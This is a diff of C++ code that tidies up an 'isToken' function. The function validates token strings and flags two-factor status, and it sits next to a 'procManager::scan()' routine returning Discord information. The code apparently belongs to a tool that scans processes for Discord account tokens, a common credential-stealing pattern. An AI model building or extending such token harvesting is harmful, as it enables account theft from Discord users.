@@ -178,24 +178,13 @@ bool containsWhitespace(char const* c) {
 
 bool isToken(char tokenBuffer[]) {
 
-
     // 2 factor check
-    if (tokenBuffer[3] == '.') {
-        account.user.twofactor = true;
-    }
-    else {
-        // 2 factor disabled
-        account.user.twofactor = false;
-    }
+    if (tokenBuffer[3] == '.') account.user.twofactor = true;
+    else account.user.twofactor = false;
 
-    // checks
-    if (containsWhitespace(tokenBuffer)) {
-        return false;
-    }
-    else {
-        return true;
-    }
-    return true;
+    // whitespace check
+    if (containsWhitespace(tokenBuffer)) return false;
+    else return true;
 }
 discordInformation procManager::scan() {
     // JSON struct
